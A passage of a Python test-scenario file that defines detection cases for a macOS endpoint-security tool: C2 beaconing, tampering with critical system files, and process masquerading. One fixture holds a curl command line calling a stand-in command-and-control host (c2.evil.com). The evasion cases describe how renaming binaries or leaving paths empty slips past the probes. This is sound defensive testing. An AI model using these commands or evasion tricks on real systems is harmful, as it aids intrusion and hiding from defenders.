    why="Empty connections list.",
    events=[],
    shared_data_key="connections",
    expect_count=0,
)

_C2_BEN2 = AdversarialCase(
    id="macos_c2_all_whitelisted",
    title="All connections are whitelisted apps — 0 events",
    category="benign",
    description="Safari and Chrome connections only.",
    why="Both are in _BEACON_WHITELIST.",
    events=[
        _conn(
            pid=100,
            process_name="Safari",
            state="ESTABLISHED",
            remote_ip="17.253.144.10",
            remote_port=443,
            remote_addr="17.253.144.10:443",
        ),
        _conn(
            pid=101,
            process_name="Google Chrome",
            state="ESTABLISHED",
            remote_ip="142.250.80.4",
            remote_port=443,
            remote_addr="142.250.80.4:443",
        ),
    ],
    shared_data_key="connections",
    expect_count=0,
)

MACOS_C2_BEACON_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_c2_beacon",
        agent="macos_network",
        name="macos_c2_beacon",
        title="macOS C2 Beacon: Periodic Connection Detection (T1071)",
        description=(
            "An attacker's implant beacons to a C2 server at regular intervals. "
            "Tests stateful accumulation across scan cycles, whitelist bypass, "
            "and private IP filtering."
        ),
        mitre_techniques=["T1071", "T1071.001"],
        mitre_tactics=["command_and_control"],
        probe_factory=C2BeaconProbe,
        cases=[
            # Stateful chain: 3 scans to reach threshold
            _C2_POS1_BASELINE,
            _C2_POS1_SCAN2,
            _C2_POS1_FIRE,
            # Evasions (non-stateful breakers)
            _C2_EVA1,
            _C2_EVA2,
            _C2_EVA3,
            # Benign
            _C2_BEN1,
            _C2_BEN2,
        ],
    )
)


# =============================================================================
# 11. macOS Critical File Change (Filesystem Observatory)
# =============================================================================

_CF_BASELINE_FILES = [
    _file(path="/etc/hosts", name="hosts", sha256="h" * 64),
    _file(path="/etc/sudoers", name="sudoers", sha256="s" * 64),
    _file(path="/etc/passwd", name="passwd", sha256="p" * 64),
    _file(path="/etc/resolv.conf", name="resolv.conf", sha256="r" * 64),
]

_CF_MODIFIED_HOSTS = _file(
    path="/etc/hosts",
    name="hosts",
    sha256="m" * 64,  # Changed hash
)
_CF_MODIFIED_SUDOERS = _file(
    path="/etc/sudoers",
    name="sudoers",
    sha256="x" * 64,  # Changed hash
)

_CF_POS1_BASELINE = AdversarialCase(
    id="macos_cf_baseline",
    title="Critical file baseline — learn existing hashes, 0 events",
    category="positive",
    description="First scan establishes baseline of critical file hashes.",
    why="First run → silent baseline learning.",
    events=_CF_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_CF_POS1_HOSTS_MODIFIED = AdversarialCase(
    id="macos_cf_hosts_modified",
    title="/etc/hosts modified — HIGH severity",
    category="positive",
    description=(
        "Attacker modifies /etc/hosts to redirect DNS queries. "
        "Hash changed from baseline."
    ),
    why="Path in baseline, hash changed → critical_file modified event.",
    events=[
        _CF_MODIFIED_HOSTS,
        _CF_BASELINE_FILES[1],
        _CF_BASELINE_FILES[2],
        _CF_BASELINE_FILES[3],
    ],
    shared_data_key="files",
    expect_count=1,
    expect_event_types=["macos_critical_file_modified"],
    expect_severity=Severity.HIGH,
    stateful=True,
)

_CF_EVA1 = AdversarialCase(
    id="macos_cf_non_critical_file",
    title="Modified /etc/motd — not in critical file list",
    category="evasion",
    description="Attacker modifies /etc/motd (message of the day).",
    why="/etc/motd not in CriticalFileProbe._target_paths → not tracked.",
    events=[
        _file(path="/etc/motd", name="motd", sha256="new_hash_motd"),
    ],
    shared_data_key="files",
    expect_evades=True,
)

_CF_POS2_BASELINE = AdversarialCase(
    id="macos_cf_baseline2",
    title="Baseline for sudoers test",
    category="positive",
    description="Fresh baseline.",
    why="Need fresh probe for sudoers modification test.",
    events=_CF_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_CF_POS2_SUDOERS = AdversarialCase(
    id="macos_cf_sudoers_modified",
    title="/etc/sudoers modified — CRITICAL severity",
    category="positive",
    description=(
        "Attacker modifies /etc/sudoers to add NOPASSWD entry. "
        "sudoers is elevated to CRITICAL by CriticalFileProbe."
    ),
    why="sudoers is in the CRITICAL escalation set in _make_file_event.",
    events=[
        _CF_BASELINE_FILES[0],
        _CF_MODIFIED_SUDOERS,
        _CF_BASELINE_FILES[2],
        _CF_BASELINE_FILES[3],
    ],
    shared_data_key="files",
    expect_count=1,
    expect_event_types=["macos_critical_file_modified"],
    expect_severity=Severity.CRITICAL,
    stateful=True,
)

_CF_BEN1 = AdversarialCase(
    id="macos_cf_no_changes",
    title="All critical files unchanged — 0 events",
    category="benign",
    description="Normal operation: all hashes match baseline.",
    why="All paths and hashes identical → no changes detected.",
    events=_CF_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,  # Continues from chain but won't fire
)

_CF_POS3_BASELINE = AdversarialCase(
    id="macos_cf_baseline3",
    title="Baseline for removal test",
    category="positive",
    description="Fresh baseline.",
    why="Need fresh probe for removal detection test.",
    events=_CF_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_CF_POS3_REMOVED = AdversarialCase(
    id="macos_cf_passwd_removed",
    title="/etc/passwd missing — MEDIUM severity removal",
    category="positive",
    description="Attacker deletes or moves /etc/passwd.",
    why="Path in baseline but not in current scan → removed event.",
    events=[
        _CF_BASELINE_FILES[0],
        _CF_BASELINE_FILES[1],
        # passwd missing!
        _CF_BASELINE_FILES[3],
    ],
    shared_data_key="files",
    expect_count=1,
    expect_event_types=["macos_critical_file_removed"],
    expect_severity=Severity.MEDIUM,
    stateful=True,
)

_CF_BEN2 = AdversarialCase(
    id="macos_cf_empty_files",
    title="Empty files list — 0 events",
    category="benign",
    description="Collector returns empty file list.",
    why="No files to compare.",
    events=[],
    shared_data_key="files",
    expect_count=0,
)

MACOS_CRITICAL_FILE_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_critical_file",
        agent="macos_filesystem",
        name="macos_critical_file",
        title="macOS Critical File: System File Integrity Detection (T1565)",
        description=(
            "An attacker modifies critical system files (/etc/hosts, /etc/sudoers, "
            "/etc/passwd) to redirect DNS, gain passwordless sudo, or tamper with "
            "authentication. Tests baseline-diff for modify, remove, and CRITICAL "
            "severity escalation for sudoers/passwd."
        ),
        mitre_techniques=["T1565"],
        mitre_tactics=["impact"],
        probe_factory=CriticalFileProbe,
        cases=[
            # Stateful chain 1: baseline → hosts modified
            _CF_POS1_BASELINE,
            _CF_POS1_HOSTS_MODIFIED,
            # Chain breaker (evasion)
            _CF_EVA1,
            # Stateful chain 2: baseline → sudoers modified
            _CF_POS2_BASELINE,
            _CF_POS2_SUDOERS,
            # Chain breaker (benign)
            _CF_BEN2,
            # Stateful chain 3: baseline → passwd removed
            _CF_POS3_BASELINE,
            _CF_POS3_REMOVED,
        ],
    )
)


# =============================================================================
# 12. macOS Process Masquerade (Process Observatory)
# =============================================================================

_MASQ_POS1 = AdversarialCase(
    id="macos_masq_sshd_from_tmp",
    title="sshd running from /tmp/sshd — CRITICAL masquerade",
    category="positive",
    description=(
        "Process named 'sshd' is running from /tmp/sshd instead of "
        "/usr/sbin/sshd. Classic masquerading technique."
    ),
    why="name='sshd', exe='/tmp/sshd' doesn't start with '/usr/sbin/sshd'.",
    events=[
        _proc(
            pid=31400,
            name="sshd",
            exe="/tmp/sshd",
            cmdline=["/tmp/sshd", "-p", "2222"],
            parent_name="python3",
            process_guid="masq0001",
        ),
    ],
    shared_data_key="processes",
    expect_count=1,
    expect_event_types=["process_masquerade"],
    expect_severity=Severity.CRITICAL,
)

_MASQ_POS2 = AdversarialCase(
    id="macos_masq_curl_from_downloads",
    title="curl running from ~/Downloads — masquerade",
    category="positive",
    description="curl binary copied to Downloads and executed.",
    why="Expected paths for curl: {'/usr/bin/curl'}. ~/Downloads doesn't match.",
    events=[
        _proc(
            pid=31401,
            name="curl",
            exe="/Users/testuser/Downloads/curl",
            cmdline=["/Users/testuser/Downloads/curl", "http://c2.evil.com"],
            parent_name="python3",
            process_guid="masq0002",
        ),
    ],
    shared_data_key="processes",
    expect_count=1,
    expect_event_types=["process_masquerade"],
    expect_severity=Severity.CRITICAL,
)

_MASQ_POS3_CMDLINE = AdversarialCase(
    id="macos_masq_exe_empty_cmdline_fallback",
    title="sshd with empty exe, cmdline reveals /tmp path — from_cmdline",
    category="positive",
    description=(
        "Cross-user process with empty exe but cmdline[0] = /tmp/sshd. "
        "Masquerade probe now falls back to cmdline[0]."
    ),
    why="exe is empty → cmdline[0] used. '/tmp/sshd' doesn't match expected.",
    events=[
        _proc(
            pid=31402,
            name="sshd",
            exe="",
            cmdline=["/tmp/sshd", "-D"],
            parent_name="launchd",
            process_guid="masq0003",
            is_own_user=False,
        ),
    ],
    shared_data_key="processes",
    expect_count=1,
    expect_event_types=["process_masquerade"],
    expect_severity=Severity.CRITICAL,
)

_MASQ_EVA1 = AdversarialCase(
    id="macos_masq_unknown_process",
    title="Unknown process name — not in expected paths map",
    category="evasion",
    description="Process 'implant' not in _EXPECTED_PATHS → not checked.",
    why="name_lower not in _EXPECTED_PATHS → continue.",
    events=[
        _proc(
            pid=31403,
            name="implant",
            exe="/tmp/implant",
            cmdline=["/tmp/implant"],
            parent_name="python3",
            process_guid="masq0004",
        ),
    ],
    shared_data_key="processes",
    expect_evades=True,
)

_MASQ_EVA2 = AdversarialCase(
    id="macos_masq_no_exe_no_cmdline",
    title="Empty exe and empty cmdline — can't verify",
    category="evasion",
    description="Cross-user process with no path information at all.",
    why="exe='' and cmdline=[] → no resolved path → skipped.",
    events=[
        _proc(
            pid=31404,
            name="sshd",
            exe="",
            cmdline=[],
            parent_name="launchd",
            process_guid="masq0005",
            is_own_user=False,
        ),
    ],
    shared_data_key="processes",
    expect_evades=True,
)

_MASQ_EVA3 = AdversarialCase(
    id="macos_masq_renamed_not_in_map",
    title="Renamed sshd to 'daemon' — name not in map",
    category="evasion",
    description="Attacker renames sshd binary to 'daemon'. Not in expected paths.",
    why="'daemon' not in _EXPECTED_PATHS → not checked.",
    events=[
        _proc(
            pid=31405,
            name="daemon",
            exe="/tmp/sshd",
            cmdline=["/tmp/sshd"],
            parent_name="python3",
            process_guid="masq0006",
        ),
    ],
    shared_data_key="processes",
    expect_evades=True,
)

_MASQ_BEN1 = AdversarialCase(
    id="macos_masq_legitimate_sshd",
    title="sshd from /usr/sbin/sshd — legitimate, no alert",
    category="benign",
    description="Normal sshd running from expected path.",
    why="exe starts with '/usr/sbin/sshd' which is in expected set.",
    events=[
        _proc(
            pid=31406,
            name="sshd",
            exe="/usr/sbin/sshd",
            cmdline=["/usr/sbin/sshd", "-D"],
            parent_name="launchd",
            process_guid="masq0007",
        ),
    ],
    shared_data_key="processes",
    expect_count=0,
)

_MASQ_BEN2 = AdversarialCase(
    id="macos_masq_python_framework",
    title="python3 from framework path — legitimate",
    category="benign",
    description="Python3 running from Apple's framework path.",
    why="exe starts with '/Library/Frameworks/Python.framework' which is expected.",
    events=[
        _proc(
            pid=31407,
            name="python3",
            exe="/Library/Frameworks/Python.framework/Versions/3.12/bin/python3",
            cmdline=["python3", "script.py"],
            parent_name="bash",
            process_guid="masq0008",
        ),
    ],
    shared_data_key="processes",
    expect_count=0,
)

MACOS_PROCESS_MASQUERADE_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_process_masquerade",
        agent="macos_process",
        name="macos_process_masquerade",
        title="macOS Process Masquerade: Name vs Path Mismatch Detection (T1036)",
        description=(
            "An attacker names a malicious binary after a system process (sshd, "
            "curl) and runs it from a non-standard path (/tmp, ~/Downloads). "
            "Tests exe path validation, cmdline fallback for cross-user processes, "
            "and evasion via renaming."
        ),
        mitre_techniques=["T1036", "T1036.005"],
        mitre_tactics=["defense_evasion"],
        probe_factory=ProcessMasqueradeProbe,
        cases=[
            _MASQ_POS1,
            _MASQ_POS2,
            _MASQ_POS3_CMDLINE,
            _MASQ_EVA1,
            _MASQ_EVA2,
            _MASQ_EVA3,
            _MASQ_BEN1,
            _MASQ_BEN2,
        ],
    )
)
